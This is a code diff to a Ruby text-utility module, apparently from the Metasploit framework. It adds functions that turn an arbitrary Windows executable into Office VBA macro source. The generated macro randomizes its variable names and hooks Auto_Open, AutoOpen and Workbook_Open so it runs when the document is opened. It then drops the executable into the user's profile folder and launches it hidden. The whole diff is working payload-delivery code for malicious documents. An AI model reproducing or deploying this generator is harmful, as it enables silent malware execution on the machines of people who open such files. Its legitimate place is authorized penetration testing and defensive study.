@@ -679,7 +679,68 @@ module Text
 
 		return mo
 	end
+
+	def self.to_exe_vba(exe='')
+		vba = ""
+		pcs = (exe.length/2000)+1
+		idx = 0
+		
+		var_bytes = rand_text_alpha(rand(8)+8)
+		var_initx = rand_text_alpha(rand(8)+8).capitalize
+		
+		vba << "Dim #{var_bytes}(#{exe.length}) as Byte\r\n\r\n"
+		1.upto(pcs) do |pc|
+			max = 0
+			vba << "Sub #{var_initx}#{pc}()\r\n"
 			
+			while(c = exe[idx] and max < 2000)
+				vba << "\t#{var_bytes}(#{idx}) = &H#{("%.2x" % c).upcase}\r\n"
+				idx += 1
+				max += 1
+			end	
+			vba << "End Sub\r\n"
+		end
+		
+		var_lname = rand_text_alpha(rand(8)+8)
+		var_lpath = rand_text_alpha(rand(8)+8)
+		var_appnr = rand_text_alpha(rand(8)+8)
+		var_datnr = rand_text_alpha(rand(8)+8)
+		
+		vba << "Sub Auto_Open()\r\n"
+		vba << "\tDim #{var_appnr} As Integer\r\n"
+		vba << "\tDim #{var_datnr} As Integer\r\n"
+		vba << "\tDim #{var_lname} As String\r\n"
+		vba << "\tDim #{var_lpath} As String\r\n"
+		vba << "\t#{var_lname} = \"#{rand_text_alpha(rand(8)+8)}.exe\"\r\n"
+		vba << "\t#{var_lpath} = Environ(\"USERPROFILE\")\r\n"
+		vba << "\tChDrive (#{var_lpath})\r\n"
+		vba << "\tChDir (#{var_lpath})\r\n"
+		vba << "\t#{var_datnr} = FreeFile()\r\n"
+		vba << "\tOpen #{var_lname}  For Binary Access Read Write As #{var_datnr}\r\n"
+		
+		1.upto(pcs) do |pc|
+			vba << "\t#{var_initx}#{pc}\r\n"
+		end
+		
+		vba << "\tPut #{var_datnr}, , #{var_bytes}\r\n"
+		vba << "\tClose #{var_datnr}\r\n"
+		vba << "\t#{var_appnr} = Shell(#{var_lname}, vbHide)\r\n"
+		vba << "End Sub\r\n"
+		
+		vba << "Sub AutoOpen()\r\n"
+		vba << "\tAuto_Open\r\n"
+		vba << "End Sub\r\n"
+		
+		vba << "Sub Workbook_Open()\r\n"
+		vba << "\tAuto_Open\r\n"
+		vba << "End Sub\r\n"
+				
+	end
+
+	def self.to_win32pe_vba(code = "\xcc", note="")
+		to_exe_vba(to_win32pe(code, note))
+	end
+				
 	##
 	#
 	# Generators
